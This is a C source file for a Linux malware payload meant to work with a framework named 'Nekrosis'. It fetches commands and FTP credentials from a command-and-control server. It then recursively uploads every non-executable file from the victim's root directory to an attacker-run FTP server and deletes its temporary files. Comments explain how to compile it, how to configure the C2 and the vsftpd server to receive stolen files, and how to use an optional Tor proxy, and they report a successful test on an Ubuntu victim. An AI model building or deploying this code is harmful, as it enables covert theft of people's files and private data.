#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>

// Author: Ezra Fast

/* COMPILATION: 				--> Compiling with header files turned into a nightmare, enjoy this monolithic beast!
 * sudo apt install libcurl4-openssl-dev
 * gcc main.c -o main -s -lcurl
*/
/* COMPILATION FOR WINDOWS:
 * 
 * gcc .\linux-main.c -o .\linux-main -IC:\curl\include\curl -LC:\curl\lib -lcurl
 *	- obtain curl from the following link: https://curl.se/windows/
 *	- find the directory containing curl.h
 *	- specify that directory with the -I option and the lib directory with the -L option
 * */
/* SUPPORTED DIRECTIVES:
 * - COPY
*/

/* OPERATING THE C2:
 * Leave the control directive in "instruction.txt" and serve at CADDRESS as shown below. You also need to serve valid FTP credentials as shown in the global variable declarations.
 * 
 * The configuration of the VSFTPD server has a few sensitivities:
 * 	- unless the server itself is facing the internet, the passive mode port needs to be declared and forwarded to the internet (pasv_min_port and pasv_max_port) along with the listening port
 * 	- The root directory of the user used to login to the FTP server should be set to the directory that shall contain the stolen files. That is why only the file is specified in the FTP link (local_root)
 * 	- The server must be configured to allow authenticated users to perform write operations (write_enable)
 * 
 * The structure of the victim's file system is not maintained. All files are copied into the FTP user's root directory. Each copied file is prefixed with a short sequence of pseudo-random
 * characters so that duplicate file names do not cause issues.
 *
 * Executable files are not copied from the victim to the C2. They considerably increase the overhead of the attack and present very little value when compared to human-readable files (including PDFs, DOCs, etc).
*/

/* DESCRIPTION:
 * This is a pure C payload meant to target Linux systems in an effort to establish persistence. It was made to be used in conjunction with the Nekrosis application.
 * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and copy all non-executable files.
 * 
 * NOTE: This payload currently implements no obfuscation or evasion techniques. These are not necessary in most cases as many Linux targets do not have monitoring solutions.
*/

/* TESTING:
 * Always test before deployment.
 * Friday, February 23, 2024: This payload was successfully tested on an Ubuntu 22.04 LTS Victim with a VSFTPD server receiving the results over the public internet.
 * */

// Prototypes:

char * readFile(char * fileName);
char * takeControlInstruction(void); 
void Copy(char * rootDirectory, char * username, char * password);
void copyContents(char * fileName, char * suffix, char * username, char * password);
char * takeUsername(void);
char * takePassword(void);
char * cleanString(char * string);
void generateRandomSequence(char * buffer);
char * replaceSpaces(char * string);

// Globals:

char * CADDRESS = "http://ADDRESS:PORT/instruction.txt";
char * USERNAMEADDRESS = "http://ADDRESS:PORT/username.txt"; 
char * PASSWORDADDRESS = "http://ADDRESS:PORT/password.txt"; 
char * BASEDIRECTORY = "/";

// Main function:

int main(void) {
	
	char * controllerDirective;
	char * username = cleanString(takeUsername());
	char * password = cleanString(takePassword());
	controllerDirective = takeControlInstruction();

	if (strcmp(controllerDirective, "COPY") == 0) {
		Copy(BASEDIRECTORY, username, password);
	}

	return 0;
}

// Function definitions:

void Copy(char * rootDirectory, char * username, char * password) {
	
	char * current;

	struct dirent * entry;
	DIR * dir = opendir(rootDirectory);

	if (dir == NULL) {
		// printf("Cannot open directory.");
		return;
	}

	while ((entry = readdir(dir)) != NULL) {
		char fullPath[1024];
		snprintf(fullPath, sizeof(fullPath), "%s/%s", rootDirectory, entry->d_name);

		struct stat path_stat;
		stat(fullPath, &path_stat);

		if (S_ISREG(path_stat.st_mode)) {			// Detects Files
			current = fullPath;
			if (access(fullPath, X_OK) != 0) {							// Checking if the file is executable; if so, we don't care about it.
				copyContents(current, entry->d_name, username, password);				// Calling copyContents
			}
		}
		else if (S_ISDIR(path_stat.st_mode)) {			// Detects Directories
			if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
				Copy(fullPath, username, password);
			}
			else if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
				continue;
			}
		}
	}

	closedir(dir);

	system("rm tmp");
	system("rm username");
	system("rm password");
}

void copyContents(char * fileName, char * suffix, char * username, char * password) {		// This copies a single file per call	

	CURL * curl;
	CURLcode res;

	suffix = replaceSpaces(suffix);
	
	char * randomPrefix = calloc(1024, 1);		// Calloc is crucial here as the randomPrefix buffer is wiped anew in every call to copyContents. This caused many problems during development.
	if (randomPrefix == NULL) {
		return;
	}
	generateRandomSequence(randomPrefix);		// Filling the newly zero-initialized memory block

	FILE * srcFile;
	struct stat fileInfo;

	if (stat(fileName, &fileInfo)) {
		// printf("Could not open %s: %s", fileName, strerror(errno));
		return;
	}

	srcFile = fopen(fileName, "rb");

	curl_global_init(CURL_GLOBAL_ALL);
	curl = curl_easy_init();

	if (curl) {
		curl_easy_setopt(curl, CURLOPT_USERNAME, username);
		curl_easy_setopt(curl, CURLOPT_PASSWORD, password);

		curl_easy_setopt(curl, CURLOPT_FTP_USE_EPSV, 1L);

		char * dstFileName = strcat(randomPrefix, suffix);

		char prelimLink[1024] = "ftp://ADDRESS:PORT/";
		char * link = strcat(prelimLink, dstFileName);			// revert to suffix if this breaks

		curl_easy_setopt(curl, CURLOPT_URL, link);			// "ftp://ADDRESS:PORT/file.txt" --> only the file needs to be specified

		curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);			// Setting file upload option

		curl_easy_setopt(curl, CURLOPT_READDATA, srcFile);

		curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)fileInfo.st_size);

		res = curl_easy_perform(curl);

		if (res != CURLE_OK) {
			/*fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));*/
		}

		curl_easy_cleanup(curl);
	} else {return;}

	fclose(srcFile);

	curl_global_cleanup();

}

char * takeControlInstruction(void) {			// Contact C2, place directive in file named "tmp"
	CURL * curl;
	CURLcode res;

	freopen("tmp", "w", stdout);				// redirecting STDOUT to a file such that whatever is retrieved can be executed later

	curl = curl_easy_init();									// Initializing the structure needed to make requests
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, CADDRESS);		// Setting the server

		// curl_easy_setopt(curl, CURLOPT_PROXY, "socks5h://127.0.0.1:9050"); 			// Proxy server can be specified here

		res = curl_easy_perform(curl);								// Make the request

		if (res != CURLE_OK) {									// Handling errors
		    /*fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));*/
		}

		curl_easy_cleanup(curl);								// Cleaning up the structure we initialized earlier
	}
	
	freopen("/dev/tty", "w", stdout);		// Cleaning up output redirection; This is Linux specific

	char * instruction = readFile("tmp");
	
	return instruction;
}

char * readFile(char * fileName) {
	FILE * file = fopen(fileName, "r");
	if (file == NULL) {
		return "FAILED";
	}
	char * contents = malloc(20);
	while (fgets(contents, sizeof(contents), file)) {}

	fclose(file);

	return contents;
}

char * takeUsername(void) {
	CURL * curl;
	CURLcode res;
	freopen("username", "w", stdout);				

	curl = curl_easy_init();									
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, USERNAMEADDRESS);		
		res = curl_easy_perform(curl);								
		if (res != CURLE_OK) {									
		    /*fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));*/
		}
		curl_easy_cleanup(curl);								
	}
	
	freopen("/dev/tty", "w", stdout);		

	char * username = readFile("username");
	
	return username;
}

char * takePassword(void) {
	CURL * curl;
	CURLcode res;
	freopen("password", "w", stdout);				

	curl = curl_easy_init();									
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, PASSWORDADDRESS);		
		res = curl_easy_perform(curl);								
		if (res != CURLE_OK) {									
		    /*fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));*/
		}
		curl_easy_cleanup(curl);								
	}
	
	freopen("/dev/tty", "w", stdout);		

	char * password = readFile("password");
	
	return password;
}

char * cleanString(char * string) {
	int length = strlen(string);

	if (string[length - 1] == '\n') {
		string[length - 1] = '\0';
	}
	return string;
}

void generateRandomSequence(char * buffer) {				// This will generate random sequences 9 characters in length

	char alphaSet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

	srand(time(NULL));

	for (int i = 0; i < 9; i++) {
		int key = rand() % (int)(sizeof(alphaSet) - 1);
		buffer[i] = alphaSet[key];
	}
}

char * replaceSpaces(char * string) {

	for (int i = 0; i < strlen(string); i++) {
		if (string[i] == ' ' || string[i] == '-') {
			string[i] = '_';
		}
	}
	return string;
}
